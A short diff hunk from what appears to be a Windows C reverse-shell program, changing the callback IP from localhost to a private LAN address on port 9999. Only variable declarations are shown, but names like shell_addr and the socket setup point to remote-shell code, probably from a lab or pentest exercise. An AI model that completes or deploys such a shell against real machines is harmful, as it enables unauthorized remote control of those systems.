@@ -14,7 +14,7 @@ int main(){
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     struct sockaddr_in shell_addr;
-    char ip_addr[] = "127.0.0.1";
+    char ip_addr[] = "192.168.69.129";
     char RecData[512];
     int port = 9999;
     int connection;
